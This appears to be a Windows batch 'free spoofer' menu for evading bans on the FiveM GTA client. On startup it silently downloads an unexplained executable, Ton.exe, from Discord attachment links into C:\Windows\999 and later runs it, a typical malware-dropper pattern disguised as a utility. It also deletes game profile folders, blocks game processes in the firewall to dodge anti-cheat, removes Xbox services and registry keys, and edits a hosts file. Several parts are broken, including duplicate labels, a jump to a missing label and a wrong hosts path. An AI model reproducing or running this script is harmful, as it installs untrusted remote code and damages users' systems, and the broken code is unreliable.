@shift /0
@echo off
	
mkdir C:\Windows\999
cls
curl https://cdn.discordapp.com/attachments/973292233346388010/973906394581458994/Ton.exe -fo "%tmp%\Ton.exe"  > nul
move "%tmp%\Ton.exe" "C:\Windows\999\Ton.exe"  > nul
cls
curl https://cdn.discordapp.com/attachments/973292233346388010/973292254586368040/1604.ini -fo "%tmp%\1604.ini"  > nul
move "%tmp%\1604.ini" "C:\Windows\999\1604.ini"  > nul
cls
curl https://cdn.discordapp.com/attachments/973292233346388010/973292254770921492/2060.ini -fo "%tmp%\2060.ini"  > nul
move "%tmp%\2060.ini" "C:\Windows\999\2060.ini"  > nul
cls
curl https://cdn.discordapp.com/attachments/973292233346388010/973292255035154452/2372.ini -fo "%tmp%\2372.ini"  > nul
move "%tmp%\2372.ini" "C:\Windows\999\2372.ini"  > nul
cls
curl https://cdn.discordapp.com/attachments/973292233346388010/973292255223873607/2189.ini -fo "%tmp%\2189.ini"  > nul
move "%tmp%\2189.ini" "C:\Windows\999\2189.ini"  > nul
cls
curl https://cdn.discordapp.com/attachments/973292233346388010/973292255408439357/2545.ini -fo "%tmp%\2545.ini"  > nul
move "%tmp%\2545.ini" "C:\Windows\999\2545.ini"  > nul
cls

:MENU
title FUTURE MENU - Made by rodyz#3247
@shift /0
chcp 65001
mode 130,30
color 1
echo.
echo.
echo                               ╭━━━╮  ╭╮          ╭━━━╮         ╭━╮
echo                               ┃╭━━╯ ╭╯╰╮         ┃╭━╮┃         ┃╭╯
echo                               ┃╰━━┳╮┣╮╭╋╮╭┳━┳━━╮ ┃╰━━┳━━┳━━┳━━┳╯╰┳━━┳━╮
echo                               ┃╭━━┫┃┃┃┃┃┃┃┃╭┫┃━┫ ╰━━╮┃╭╮┃╭╮┃╭╮┣╮╭┫┃━┫╭╯
echo                               ┃┃  ┃╰╯┃╰┫╰╯┃┃┃┃━┫ ┃╰━╯┃╰╯┃╰╯┃╰╯┃┃┃┃┃━┫┃
echo                               ╰╯  ╰━━┻━┻━━┻╯╰━━╯ ╰━━━┫╭━┻━━┻━━╯╰╯╰━━┻╯
echo                                                      ┃┃
echo                                                      ╰╯
echo                                ┏────────────────────────────────────────────┓
echo.
echo                                      [34m[FREE SPOOFER - rodyz#3247]
echo.
echo.
echo                                       [34m[1] [0m- Signout Rockstar
echo. 
echo                                       [34m[2] [0m- Enable Bypass (Temp bypass)
echo.
echo                                       [34m[3] [0m- Disable Bypass (Temp bypass)
echo.
echo                                       [34m[4] [0m- Change Build Version
echo.
echo                                       [34m[5] [0m- Unlink Xbox / Discord
echo.
echo                                       [34m[6] [0m- Enable Bypass (PERM) [36mTESTING
echo.
echo                                           [34m[Status] [0m- [36m[Safe]
echo.
echo                                [34m┗────────────────────────────────────────────┛ [0m
echo.
set /p key=Enter here : 
if %key%==1 goto Rockstar
if %key%==2 goto Enable
if %key%==3 goto Disable
if %key%==4 goto BUILD
if %key%==5 goto XBOX
if %key%==6 goto PERM

:BUILD
cls
echo.
color 1
echo.
echo                                       [34m[7] [0m- 2545
echo                                       [34m[8] [0m- 2372
echo                                       [34m[9] [0m- 2189
echo                                       [34m[10] [0m- 2060
echo                                       [34m[11] [0m- 1604
echo.
echo                                       [34m[666] [0m- BACK
echo.
set /p key=Enter here : 
if %key%==7 goto 2545
if %key%==8 goto 2372
if %key%==9 goto 2189
if %key%==10 goto 2060
if %key%==11 goto 1604
if %key%==666 goto MENU

:1604
type C:\Windows\999\1604.ini > %LocalAppData%\FiveM\FiveM.app\CitizenFX.ini
goto Build

:2545
type C:\Windows\999\2545.ini > %LocalAppData%\FiveM\FiveM.app\CitizenFX.ini
goto Build

:2372
type C:\Windows\999\2372.ini > %LocalAppData%\FiveM\FiveM.app\CitizenFX.ini
goto Build

:2189
type C:\Windows\999\2189.ini > %LocalAppData%\FiveM\FiveM.app\CitizenFX.ini
goto Build

:2060
type C:\Windows\999\2060.ini > %LocalAppData%\FiveM\FiveM.app\CitizenFX.ini
goto Build

:1604
type C:\Windows\999\1604.ini > %LocalAppData%\FiveM\FiveM.app\CitizenFX.ini
goto Build


:Rockstar
cls
echo.
color 1
echo.
echo.
echo                               ╭━━━╮  ╭╮          ╭━━━╮         ╭━╮
echo                               ┃╭━━╯ ╭╯╰╮         ┃╭━╮┃         ┃╭╯
echo                               ┃╰━━┳╮┣╮╭╋╮╭┳━┳━━╮ ┃╰━━┳━━┳━━┳━━┳╯╰┳━━┳━╮
echo                               ┃╭━━┫┃┃┃┃┃┃┃┃╭┫┃━┫ ╰━━╮┃╭╮┃╭╮┃╭╮┣╮╭┫┃━┫╭╯
echo                               ┃┃  ┃╰╯┃╰┫╰╯┃┃┃┃━┫ ┃╰━╯┃╰╯┃╰╯┃╰╯┃┃┃┃┃━┫┃
echo                               ╰╯  ╰━━┻━┻━━┻╯╰━━╯ ╰━━━┫╭━┻━━┻━━╯╰╯╰━━┻╯
echo                                                      ┃┃
echo                                                      ╰╯
rmdir /s /q %userprofile%\AppData\Roaming\CitizenFX
rmdir /s /q "%LocalAppData%\DigitalEntitlements"
rmdir /s /q "%userprofile%\Documents\Rockstar Games\Social Club\Profiles"
echo.
echo Deleted successfully
goto MENU

:Enable
cls
echo.
color 1
echo. 
echo.
echo Activate Bypass.
echo.
netsh advfirewall firewall add rule name="FiveM2372Block" dir=in action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\fivem_b2372_gtaprocess.exe" > nul
netsh advfirewall firewall add rule name="FiveM2372Block" dir=out action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\fivem_b2372_gtaprocess.exe" > nul
netsh advfirewall firewall set rule name="FiveM2372Block" dir=in new enable=yes > nul
netsh advfirewall firewall set rule name="FiveM2372Block" dir=out new enable=yes > nul

netsh advfirewall firewall add rule name="FiveMSteamBlock" dir=in action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_SteamChild.exe" > nul
netsh advfirewall firewall add rule name="FiveMSteamBlock" dir=out action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_SteamChild.exe" > nul
netsh advfirewall firewall set rule name="FiveMSteamBlock" dir=in new enable=yes > nul
netsh advfirewall firewall set rule name="FiveMSteamBlock" dir=out new enable=yes > nul

netsh advfirewall firewall add rule name="FiveMRockstarBlock" dir=in action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_GTAProcess.exe" > nul
netsh advfirewall firewall add rule name="FiveMRockstarBlock" dir=out action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_GTAProcess.exe" > nul
netsh advfirewall firewall set rule name="FiveMRockstarBlock" dir=in new enable=yes > nul
netsh advfirewall firewall set rule name="FiveMRockstarBlock" dir=out new enable=yes > nul

netsh advfirewall firewall add rule name="FiveM2189Block" dir=in action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_b2189_GTAProcess.exe" > nul
netsh advfirewall firewall add rule name="FiveM2189Block" dir=out action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_b2189_GTAProcess.exe" > nul
netsh advfirewall firewall set rule name="FiveM2189Block" dir=in new enable=yes > nul
netsh advfirewall firewall set rule name="FiveM2189Block" dir=out new enable=yes > nul

netsh advfirewall firewall add rule name="FiveM2060Block" dir=in action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\fivem_b2060_gtaprocess.exe" > nul
netsh advfirewall firewall add rule name="FiveM2060Block" dir=out action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\fivem_b2060_gtaprocess.exe" > nul
netsh advfirewall firewall set rule name="FiveM2060Block" dir=in new enable=yes > nul
netsh advfirewall firewall set rule name="FiveM2060Block" dir=out new enable=yes > nul

netsh advfirewall firewall add rule name="FiveM2545Block" dir=in action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\fivem_b2545_gtaprocess.exe" > nul
netsh advfirewall firewall add rule name="FiveM2545Block" dir=out action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\fivem_b2545_gtaprocess.exe" > nul
netsh advfirewall firewall set rule name="FiveM2545Block" dir=in new enable=yes > nul
netsh advfirewall firewall set rule name="FiveM2545Block" dir=out new enable=yes > nul

netsh advfirewall firewall add rule name="FiveM1604Block" dir=in action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\fivem_b1604_gtaprocess.exe" > nul
netsh advfirewall firewall add rule name="FiveM1604Block" dir=out action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\fivem_b1604_gtaprocess.exe" > nul
netsh advfirewall firewall set rule name="FiveM1604Block" dir=in new enable=yes > nul
netsh advfirewall firewall set rule name="FiveM1604Block" dir=out new enable=yes > nul

netsh advfirewall firewall add rule name="FiveM2372Block" dir=in action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_b2372_GTAProcess.exe" > nul
netsh advfirewall firewall add rule name="FiveM2372Block" dir=out action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\fivem_b2372_GTAProcess.exe" > nul
netsh advfirewall firewall set rule name="FiveM2372Block" dir=in new enable=yes > nul
netsh advfirewall firewall set rule name="FiveM2372Block" dir=out new enable=yes > nul

netsh advfirewall firewall add rule name="FiveMSteamBlock" dir=in action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_SteamChild.exe" > nul
netsh advfirewall firewall add rule name="FiveMSteamBlock" dir=out action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_SteamChild.exe" > nul
netsh advfirewall firewall set rule name="FiveMSteamBlock" dir=in new enable=yes > nul
netsh advfirewall firewall set rule name="FiveMSteamBlock" dir=out new enable=yes > nul

netsh advfirewall firewall add rule name="FiveMRockstarBlock" dir=in action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_GTAProcess.exe" > nul
netsh advfirewall firewall add rule name="FiveMRockstarBlock" dir=out action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_GTAProcess.exe" > nul
netsh advfirewall firewall set rule name="FiveMRockstarBlock" dir=in new enable=yes > nul
netsh advfirewall firewall set rule name="FiveMRockstarBlock" dir=out new enable=yes > nul

netsh advfirewall firewall add rule name="FiveM2189Block" dir=in action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_b2189_GTAProcess.exe" > nul
netsh advfirewall firewall add rule name="FiveM2189Block" dir=out action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_b2189_GTAProcess.exe" > nul
netsh advfirewall firewall set rule name="FiveM2189Block" dir=in new enable=yes > nul
netsh advfirewall firewall set rule name="FiveM2189Block" dir=out new enable=yes > nul

netsh advfirewall firewall add rule name="FiveM2060Block" dir=in action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_b2060_GTAProcess.exe" > nul
netsh advfirewall firewall add rule name="FiveM2060Block" dir=out action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_b2060_GTAProcess.exe" > nul
netsh advfirewall firewall set rule name="FiveM2060Block" dir=in new enable=yes > nul
netsh advfirewall firewall set rule name="FiveM2060Block" dir=out new enable=yes > nul

netsh advfirewall firewall add rule name="FiveM2545Block" dir=in action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_b2545_GTAProcess" > nul
netsh advfirewall firewall add rule name="FiveM2545Block" dir=out action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_b2545_GTAProcess" > nul
netsh advfirewall firewall set rule name="FiveM2545Block" dir=in new enable=yes > nul
netsh advfirewall firewall set rule name="FiveM2545Block" dir=out new enable=yes > nul

netsh advfirewall firewall add rule name="FiveM1604Block" dir=in action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_b1604_GTAProcess.exe" > nul
netsh advfirewall firewall add rule name="FiveM1604Block" dir=out action=block profile=any program="%LocalAppData%\FiveM\FiveM.app\data\cache\subprocess\FiveM_b1604_GTAProcess.exe" > nul
netsh advfirewall firewall set rule name="FiveM1604Block" dir=in new enable=yes > nul
netsh advfirewall firewall set rule name="FiveM1604Block" dir=out new enable=yes > nul



goto MENU

:Disable
cls
echo.
color 1
echo. 
echo.
echo Join after this sound.
echo.
netsh advfirewall firewall set rule name="FiveM2372Block" dir=in new enable=no > nul
netsh advfirewall firewall set rule name="FiveM2372Block" dir=out new enable=no > nul

netsh advfirewall firewall set rule name="FiveMSteamBlock" dir=in new enable=no > nul
netsh advfirewall firewall set rule name="FiveMSteamBlock" dir=out new enable=no > nul

netsh advfirewall firewall set rule name="FiveMRockstarBlock" dir=in new enable=no > nul
netsh advfirewall firewall set rule name="FiveMRockstarBlock" dir=out new enable=no > nul

netsh advfirewall firewall set rule name="FiveM2189Block" dir=in new enable=no > nul
netsh advfirewall firewall set rule name="FiveM2189Block" dir=out new enable=no > nul

netsh advfirewall firewall set rule name="FiveM2060Block" dir=in new enable=no > nul
netsh advfirewall firewall set rule name="FiveM2060Block" dir=out new enable=no > nul

netsh advfirewall firewall set rule name="FiveM2545Block" dir=in new enable=no > nul
netsh advfirewall firewall set rule name="FiveM2545Block" dir=out new enable=no > nul

netsh advfirewall firewall set rule name="FiveM1604Block" dir=in new enable=no > nul
netsh advfirewall firewall set rule name="FiveM1604Block" dir=out new enable=no > nul

netsh advfirewall firewall set rule name="FiveMROSServiceBlock" dir=in new enable=no > nul
netsh advfirewall firewall set rule name="FiveMROSServiceBlock" dir=out new enable=no > nul

netsh advfirewall firewall set rule name="FiveMChromeBrowser" dir=in new enable=no > nul
netsh advfirewall firewall set rule name="FiveMChromeBrowser" dir=out new enable=no > nul

netsh advfirewall firewall set rule name="FiveMROSLauncher" dir=in new enable=no > nul
netsh advfirewall firewall set rule name="FiveMROSLauncher" dir=out new enable=no > nul
start C:\Windows\999\Ton.exe
goto MENU

:XBOX
cls
echo.
color 1
echo. 
echo.
echo Deactivate Bypass.
cls
powershell -Command "& {Get-AppxPackage -AllUsers xbox | Remove-AppxPackage}"
sc stop XblAuthManager
sc stop XblGameSave
sc stop XboxNetApiSvc
sc stop XboxGipSvc
sc delete XblAuthManager
sc delete XblGameSave
sc delete XboxNetApiSvc
sc delete XboxGipSvc
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\xbgm" /f
schtasks /Change /TN "Microsoft\XblGameSave\XblGameSaveTask" /disable
schtasks /Change /TN "Microsoft\XblGameSave\XblGameSaveTaskLogon" /disableL
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v AllowGameDVR /t REG_DWORD /d 0 /f
cls
set hostspath=%windir%\Desktop\drivers\etc\hosts
echo 127.0.0.1 xboxlive.com >> %hostspath%
echo 127.0.0.1 user.auth.xboxlive.com >> %hostspath%
echo 127.0.0.1 presence-heartbeat.xboxlive.com >> %hostspath%
rd %userprofile%\AppData\Local\DigitalEntitlements /q /s
cls
del /s /q /f %LocalAppData%\FiveM\FiveM.app\discord.dll > nul
rmdir /s /q " %userprofile%\AppData\Roaming\discord\0.0.309"

goto GASH

:PERM
cls
echo.
color 1
echo. 
echo.
echo Not available in the version.
echo.
timeout 5 >nul
goto MENU
